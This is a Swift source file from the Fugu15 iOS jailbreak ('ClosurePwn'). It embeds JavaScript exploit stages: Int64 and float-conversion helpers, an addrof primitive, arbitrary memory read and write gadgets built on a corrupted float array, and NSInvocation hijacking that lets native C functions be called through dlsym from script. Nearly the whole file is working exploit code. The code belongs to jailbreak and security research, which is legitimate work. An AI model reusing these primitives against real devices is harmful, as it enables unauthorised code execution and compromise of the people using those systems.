//
//  JSUtilsSetup.swift
//  ClosurePwn
//
//  Created by Linus Henze.
//  Copyright © 2021 Linus Henze. All rights reserved.
//

public let jsUtilsData = """
//
//  utils.js
//  Fugu15
//
//  Based on crash_kernel.js from the iOS 12.4 iMessage exploit by Samuel Groß
//  See https://bugs.chromium.org/p/project-zero/issues/detail?id=1917#c6
//  Description of SLOP: https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-3.html
//

// Basic assert functionality.
function assert(cond) {
    if (!cond) {
        throw "assertion failed";
    }
}

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    let res = [];
    for (let i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    let bytes = new Uint8Array(hexstr.length / 2);
    for (let i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    let lines = [];
    for (let i = 0; i < data.length; i += 16) {
        let chunk = data.slice(i, i+16);
        let parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\\n');
}

// Simplified version of the similarly named python module.
let Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    let buffer      = new ArrayBuffer(8);
    let byteView    = new Uint8Array(buffer);
    let uint32View  = new Uint32Array(buffer);
    let float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            let view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            let view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
class Int64 {
    constructor(v) {
        // The underlying byte array.
        this._bytes = new Uint8Array(8);

        switch (typeof v) {
            case 'number':
                v = Math.floor(v).toString(16);
            case 'string':
                if (v.startsWith('0x'))
                    v = v.substr(2);
                if (v.length % 2 == 1)
                    v = '0' + v;

                let bigEndian = unhexlify(v, 8);
                this._bytes.set(Array.from(bigEndian).reverse());
                break;
            case 'object':
                if (v instanceof Int64) {
                    this._bytes.set(v.bytes());
                } else {
                    if (v.length != 8)
                        throw TypeError("Array must have excactly 8 elements.");
                    this._bytes.set(v);
                }
                break;
            case 'undefined':
                break;
            default:
                throw TypeError("Int64 constructor requires an argument.");
        }
    }

    // Constructs a new Int64 instance with the same bit representation as the provided double.
    static fromDouble(d) {
        let bytes = Struct.pack(Struct.float64, d);
        return new Int64(bytes);
    }
        
    toInt32(i) {
        return i.dwords()[0]
    }

    // Return true if this Int64 value can be represented as a double.
    canRepresentAsDouble() {
        // Check for NaN
        return !(this._bytes[7] == 0xff && (this._bytes[6] == 0xff || this._bytes[6] == 0xfe));
    }

    // Return a double whith the same underlying bit representation.
    asDouble() {
        if (!this.canRepresentAsDouble()) {
            throw new RangeError("Integer can not be represented by a double");
        }

        return Struct.unpack(Struct.float64, this._bytes);
    }

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    asJSValue() {
        if ((this._bytes[7] == 0 && this._bytes[6] == 0) || (this._bytes[7] == 0xff && this._bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        let res = Struct.unpack(Struct.float64, this._bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    }

    // Return the underlying bytes of this number as array.
    bytes() {
        return Array.from(this._bytes);
    }

    // Return the two 32bit parts of this Int64.
    dwords() {
        return Array.from(new Uint32Array(this._bytes.buffer));
    }

    // Return the byte at the given index.
    byteAt(i) {
        return this._bytes[i];
    }

    // Return the value of this number as unsigned hex string.
    toString() {
        return '0x' + hexlify(Array.from(this._bytes).reverse());
    }

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.
    assignNeg(n) {
        for (let i = 0; i < 8; i++)
            this._bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }

    // this = a + b
    assignAdd(a, b) {
        let carry = 0;
        for (let i = 0; i < 8; i++) {
            let cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            this._bytes[i] = cur;
        }
        return this;
    }
        
    nAssignAdd(a, b) {
        let carry = 0;
        for (let i = 0; i < 8; i++) {
            let cur = a.byteAt(i) + b.byteAt(i) + carry;
            if (cur > 0xFF) {
                carry = 1;
            }
            this._bytes[i] = cur & 0xFF;
        }
        return this;
    }

    // this = a - b
    assignSub(a, b) {
        let carry = 0;
        for (let i = 0; i < 8; i++) {
            let cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            this._bytes[i] = cur;
        }
        return this;
    }

    // this = a ^ b
    assignXor(a, b) {
        for (let i = 0; i < 8; i++) {
            this._bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }

    // this = a & b
    assignAnd(a, b) {
        for (let i = 0; i < 8; i++) {
            this._bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }
        
    low32() {
        return Low32(this);
    }
}

// Some frequently used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// Convenience functions. These allocate a new Int64 to hold the result.

// Decorator for Int64 instance operations. Takes care
// of converting arguments to Int64 instances if required.
// this = -n (two's complement)
function int64op(f, nargs) {
    return function() {
        if (arguments.length != nargs)
            throw Error("Not enough arguments for function " + f.name);
        for (let i = 0; i < arguments.length; i++)
            if (!(arguments[i] instanceof Int64))
                arguments[i] = new Int64(arguments[i]);
        return f.apply(this, arguments);
    };
}

// Return -n (two's complement)
const Neg = int64op(function(n) {
    return (new Int64()).assignNeg(n);
}, 1);

// Return a + b
const Add = int64op(function(a, b) {
    return (new Int64()).assignAdd(a, b);
}, 2);
              
const NAdd = int64op(function(a, b) {
    return (new Int64()).nAssignAdd(a, b);
}, 2);

// Return a - b
const Sub = int64op(function(a, b) {
    return (new Int64()).assignSub(a, b);
}, 2);

// Return a ^ b
const Xor = int64op(function(a, b) {
    return (new Int64()).assignXor(a, b);
}, 2);

// Return a & b
const And = int64op(function(a, b) {
    return (new Int64()).assignAnd(a, b);
}, 2);
              
function Low32(n) {
    return And(n, new Int64("0xFFFFFFFF"));
}

let Convert = {
    toInt32(res) {
        return res.dwords()[0];
    },
    toString(res) {
        if (res == Int64.Zero) {
            return "";
        }
        
        return mem.readCString(res);
    }
}

function addrof(obj) {
    let info = $vm.value(obj);
    let tmp = info.substr(info.indexOf("0x"));
    tmp = tmp.substr(0, tmp.indexOf(" "));
    return tmp;
}
"""

public let jsSetupData = """
//
//  setup.js
//  Fugu15
//
//  Based on crash_kernel.js from the iOS 12.4 iMessage exploit by Samuel Groß
//  See https://bugs.chromium.org/p/project-zero/issues/detail?id=1917#c6
//  Description of SLOP: https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-3.html
//

// R/W Gadgets
var mem = {
    cur: 0,
    _readUndefined(a) {
        var cur = new Int64(a);
        var res = undefined;
        do {
            res = this._read64(cur);
            cur = Add(cur, 4);
        } while (res === undefined)
        
        cur = Sub(cur, 4);
        
        // Now start to nuke
        var save = [res];
        while (cur > a) {
            this.write64(cur, Int64.Zero);
            cur = Sub(cur, 4);
            save.push(this._read64(cur));
        }
        
        // Recover real value
        res = this._read64(cur);
        res._bytes[4] = save[save.length-2]._bytes[0];
        res._bytes[5] = save[save.length-2]._bytes[1];
        res._bytes[6] = save[save.length-2]._bytes[2];
        res._bytes[7] = save[save.length-2]._bytes[3];
        
        // Restore
        while (save.length > 0) {
            this.write64(cur, save.pop());
            cur = Add(cur, 4);
        }
        
        return res;
    },
    _writeNonDouble(a, v) {
        var cur = Add(new Int64(a), 4);
        var res = undefined;
        do {
            res = this._read64(cur);
            cur = Add(cur, 4);
        } while (res === undefined)
        
        cur = Sub(cur, 4);
        
        // Now start to nuke
        var save = [res];
        while (cur > a) {
            this.write64(cur, Int64.Zero);
            cur = Sub(cur, 4);
            save.push(this._read64(cur));
        }
        
        // Write changes
        save[save.length-1]._bytes[0] = v._bytes[0];
        save[save.length-1]._bytes[1] = v._bytes[1];
        save[save.length-1]._bytes[2] = v._bytes[2];
        save[save.length-1]._bytes[3] = v._bytes[3];
        save[save.length-2]._bytes[0] = v._bytes[4];
        save[save.length-2]._bytes[1] = v._bytes[5];
        save[save.length-2]._bytes[2] = v._bytes[6];
        save[save.length-2]._bytes[3] = v._bytes[7];
        
        // Restore
        while (save.length > 0) {
            this.write64(cur, save.pop());
            cur = Add(cur, 4);
        }
        
        return res;
    },
    _read64(addr) {
        let oldval = target[0];
        let res;
        let i = 0;
        do {
            target[0] = addr.asDouble();
            res = float_arr[i];
            if (float_arr.length > i && res === undefined) {
                return undefined;
            }
            target[0] = oldval;
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        target[0] = oldval;
        return Int64.fromDouble(res);
    },
    read64(addr) {
        let res = this._read64(new Int64(addr));
        if (res === undefined) {
            return this._readUndefined(addr);
        }
        
        return res;
    },
    _write64(addr, val) {
        let oldval = target[0];
        let res;
        let i = 0;
        do {
            target[0] = addr.asDouble();
            res = float_arr[i];
            if (res !== undefined || float_arr.length > i) {
                float_arr[i] = val.asDouble();
                res = 1;
            }
            target[0] = oldval;
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        target[0] = oldval;
    },
    write64(addr, val) {
        addr = new Int64(addr);
        val = new Int64(val);
        
        if (val.canRepresentAsDouble()) {
            this._write64(addr, val);
        } else {
            this._writeNonDouble(addr, val);
        }
    },
    alloc(n) {
        if ((this.cur + n) >= 0x100000) {
            return undefined;
        }
        
        let off = this.cur;
        this.cur += n;
        
        return Add(freeMem, off);
    },
    makeCString(s) {
        let buf = this.alloc(s.length + 8);
        for (var i = 0; i < s.length; i++) {
            mem.write64(Add(buf, i), s.charCodeAt(i));
        }
        mem.write64(Add(buf, s.length), 0);
        
        return buf;
    },
    readCString(buf) {
        if (buf.underlying_buffer === undefined) {
            var res = "";
            var i = 0;
            while (1) {
                let c = mem.read64(Add(buf, i)).low32() & 0xFF;
                if (c == 0) break;
                res += String.fromCodePoint(c);
                i++;
            }
            
            return res;
        }
        
        let u = buf.underlying_buffer;
        var res = "";
        for (var i = 0; i < u.length; i++) {
            if (u[i] == 0) break;
            res += String.fromCodePoint(u[i]);
        }
        
        return res;
    },
    makeSavepoint() {
        return this.cur;
    },
    restoreSavepoint(svp) {
        this.cur = svp;
    }
}

// Get infos
let infoStart = Add(mem.read64(Add(addrof(info), 0x10)), 0x8);
let invocation1 = mem.read64(infoStart);
let invocation2 = mem.read64(Add(infoStart, 0x8));
let freeMem = mem.read64(Add(infoStart, 0x10));
let dlsymFuncPtr = mem.read64(Add(infoStart, 0x18));
let sel_sharedInstance = mem.read64(Add(infoStart, 0x20));
let sel_invokeUsingIMP = mem.read64(Add(infoStart, 0x28));
let sel_setTarget = mem.read64(Add(infoStart, 0x30));
let sel_setSelector = mem.read64(Add(infoStart, 0x38));

// Build invocation
let func = inimage.imageNamed;
let func_addr = addrof(func);
let objc_callback_function_impl_addr = mem.read64(Add(func_addr, 0x40));

let nsinvocation_addr = Add(invocation1, 0x0);
mem.write64(Add(objc_callback_function_impl_addr, 0x10), nsinvocation_addr);
mem.write64(Add(objc_callback_function_impl_addr, 0x18), 0); // Pretend to have 0 arguments

let my_frame_addr = mem.read64(Add(invocation1, 0x8));

let c_frame_addr = mem.read64(Add(invocation2, 0x8));

let func2 = inintent._redactForMissingPrivacyEntitlementOptionsContainingAppBundleId;
let func2_addr = addrof(func2);
let objc_callback_function_impl_2_addr = mem.read64(Add(func2_addr, 0x40));
let callback_result_void_addr = mem.read64(Add(objc_callback_function_impl_2_addr, 0x20));
mem.write64(Add(objc_callback_function_impl_addr, 0x20), callback_result_void_addr);

invocation1.invoke = func;
let invocation = {
    setTarget(a) {
        mem.write64(my_frame_addr, a);
    },
    getTarget(a) {
        mem.read64(my_frame_addr);
    },
    setSelector(a) {
        mem.write64(Add(my_frame_addr, 0x8), a);
    },
    setArgument(i, a) {
        mem.write64(Add(my_frame_addr, 0x10 + (i * 0x8)), a);
    },
    invoke(target) {
        invocation1.invoke();
    },
    retval() {
        // Hack alert
        // This is to make sure that the return value can always be read
        // Return value will be destroyed, so keep it!
        let addr = mem.read64(Add(nsinvocation_addr, 0x10));
        mem.write64(Add(addr, 8), 0);
        let partA = mem.read64(Add(addr, 4)).bytes();
        mem.write64(Add(addr, 4), 0);
        let partB = mem.read64(addr).bytes();
        mem.write64(Add(addr, 0), 0);
        return new Int64(partB.slice(0, 4).concat(partA.slice(0, 4)));
    }
}

let c_invocation = {
    setArgument(i, a) {
        if (i == 0) {
            invocation.setTarget(invocation2);
            invocation.setSelector(sel_setTarget);
            invocation.setArgument(0, a);
            invocation.invoke();
        } else if (i == 1) {
            invocation.setTarget(invocation2);
            invocation.setSelector(sel_setSelector);
            invocation.setArgument(0, a);
            invocation.invoke();
        } else {
            mem.write64(Add(c_frame_addr, i * 0x8), a);
        }
    },
    getArgument(i) {
        mem.read64(Add(c_frame_addr, i * 0x8));
    },
    retval() {
        let addr = mem.read64(Add(invocation2, 0x10));
        return mem.read64(addr);
    }
}

function doCCall(fun) {
    // Setup invokeUsingIMP: call
    invocation.setTarget(new Int64("0x0000133700001337"));
    invocation.setSelector(sel_invokeUsingIMP);
    
    // Write imp
    mem.write64(Add(my_frame_addr, 0x10), fun);
    
    invocation.setTarget(invocation2);
    invocation.invoke();
}

function CFuncWithPtr(fun, retValConverter) {
    let res = function(...args) {
        c_invocation.setArgument(0, 1); // Can't be zero
        
        //let prev = mem.cur;
        let savepoint = mem.makeSavepoint();
        
        for (let i = 0; i < args.length; i++) {
            if (typeof(args[i]) == 'string') {
                let tmp = mem.makeCString(args[i]);
                args[i] = tmp;
            } else if (typeof args[i] == 'object') {
                if (!(args[i] instanceof Int64)) {
                    args[i] = args[i].toInt64();
                }
            }
            
            c_invocation.setArgument(i, new Int64(args[i]));
        }
        
        doCCall(fun);
        
        mem.restoreSavepoint(savepoint);
        //mem.cur = prev; // "deallocate" memory again
        
        let ret = c_invocation.retval();
        if (retValConverter !== undefined) {
            return retValConverter(ret);
        }
        
        return ret;
    }
    
    return res;
}

function CFunc(sym, retValConverter) {
    let fun = dlsym(sym);
    
    return CFuncWithPtr(fun, retValConverter);
}

let dlsym = CFuncWithPtr(dlsymFuncPtr).bind(this, new Int64("0xfffffffffffffffe"));

let CFStringCreateWithCString = CFunc("CFStringCreateWithCString");
let NSLog = CFunc("NSLog");
let CFRelease = CFunc("CFRelease");
let kCFAllocatorMalloc = mem.read64(dlsym("kCFAllocatorMalloc"));
let kCFStringEncodingUTF8 = 0x08000100;

function log(...args) {
    /*var res = "[JS] ";
    for (var i = 0; i < args.length; i++) {
        res += "" + args[i];
    }
    
    // Avoid tagged pointers
    while (res.length < 8) {
        res += " ";
    }
    
    let cf = CFStringCreateWithCString(kCFAllocatorMalloc, res, kCFStringEncodingUTF8);
    NSLog(cf);
    CFRelease(cf);*/
    // Untether, noone is able to see the log messages anyway
    return;
}

log("Hello from JS Setup!");
"""
